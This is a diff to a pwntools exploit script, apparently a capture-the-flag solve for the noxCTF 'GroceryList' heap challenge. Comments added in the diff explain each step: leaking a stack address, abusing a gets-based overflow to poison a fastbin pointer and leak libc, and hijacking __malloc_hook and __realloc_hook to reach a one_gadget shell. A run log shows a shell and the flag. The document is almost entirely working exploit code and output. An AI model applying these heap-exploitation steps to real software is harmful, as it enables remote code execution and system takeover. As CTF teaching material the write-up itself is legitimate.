@@ -25,7 +25,7 @@ else:
     if libcPath:
         libc = ELF(libcPath)
 
-context.log_level = "debug"
+#  context.log_level = "debug"
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 success = lambda name, value: log.success("{} -> {:#x}".format(name, value))
 
@@ -70,16 +70,37 @@ def exit():
     io.sendlineafter("Exit\n", "7")
 
 if __name__ == "__main__":
+    '''
+    First, we're supposed to leak stack using add_default. This bug is easy to find.
+    '''
     add_default() # 0
     show()
     stack = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\0')) - 0x3b
     success("stack", stack)
 
+    '''
+    We have an arbitrary overflow bug in edit because of the usage of gets.
+    As a result,  we're able to modify the next freed chunk's fd pointer to anywhere we want.
+    In this case, we modify fd to a stack address to leak libc.
+
+    06:0030│      0x7fff7f0e3cb0 ◂— 0x57f0e3cde     <- modify fd here then we can leak __libc_start_main
+    07:0038│      0x7fff7f0e3cb8 ◂— 0x21 /* '!' */
+    08:0040│      0x7fff7f0e3cc0 —▸ 0x7efe08c31830 (__libc_start_main+240) ◂— mov    edi, eax
+    09:0048│      0x7fff7f0e3cc8 ◂— 0x65636f72478a3910
+    '''
     add_default() # 1
     delete(1)
     edit(0, '0' * 0x18 + p64(0x21) + p64(stack + 0x20))
     add_default() 
     
+    '''
+    Now the fastbin list is like:
+    0x21: a_chunk -> target_to_leak_libc
+    So after add_empty once, we can leak libc
+
+    And here is a trick, this challenge didn't provide the libc.
+    We assume the libc is the same as other challenges'. Luckily, so it is.(Of course we should check the leaked address)
+    '''
     add_empty(1, 1)
     show()
     io.recvuntil("2. ")
@@ -88,13 +109,42 @@ if __name__ == "__main__":
     libc.address = u64(io.recvuntil("\x7f")[-6: ].ljust(8, '\00')) - 240 - libc.sym['__libc_start_main']
     success("libc", libc.address)
 
+    #  DEBUG()
+    '''
+    Now we have libc address and the ability of fastbin attack. 
+    So we choose __malloc_hook. Hijack __malloc_hook to one_gadget using fastbin attack.
+    However, the constraints aren't satisfied so we use __realloc_hook trick, that's to say, hijack __realloc_hook to one_gadget and __malloc_hook to libc.sym['__libc_realloc'] + ?? 
+    and using pop|push|sub in __libc_realloc to adjust stack to stafify the constraints
+    '''
     add_empty(3, 2)
     delete(4)
     edit(3, '0' * 0x60 + p64(0) + p64(0x71) + p64(libc.sym['__malloc_hook'] - 0x23))
     add(3, 'cccc')
-    #  DEBUG()
     one_gadget = 0x4526a
     add(3, '0' * 11 + p64(one_gadget+ libc.address) + p64(libc.sym['__libc_realloc'] + 16))
+    '''
+    trigger one_gadget and enjoy your shell
+    root@a8e7f172b018:~/grocery# python solve.py r
+    [*] '/root/grocery/GroceryList'
+        Arch:     amd64-64-little
+        RELRO:    Full RELRO
+        Stack:    Canary found
+        NX:       NX enabled
+        PIE:      PIE enabled
+    [+] Opening connection to chal.noxale.com on port 1232: Done
+    [*] '/root/grocery/libc.so.6'
+        Arch:     amd64-64-little
+        RELRO:    Partial RELRO
+        Stack:    Canary found
+        NX:       NX enabled
+        PIE:      PIE enabled
+    [+] stack -> 0x7ffe91f0a4c0
+    [+] libc -> 0x7fcf10720000
+    [*] Switching to interactive mode
+    $ cat flag
+    noxCTF{I_L0ve_F0rg1ng_Chunk5}
+    $
+    '''
     add_empty(1, 1)
 
     io.interactive()
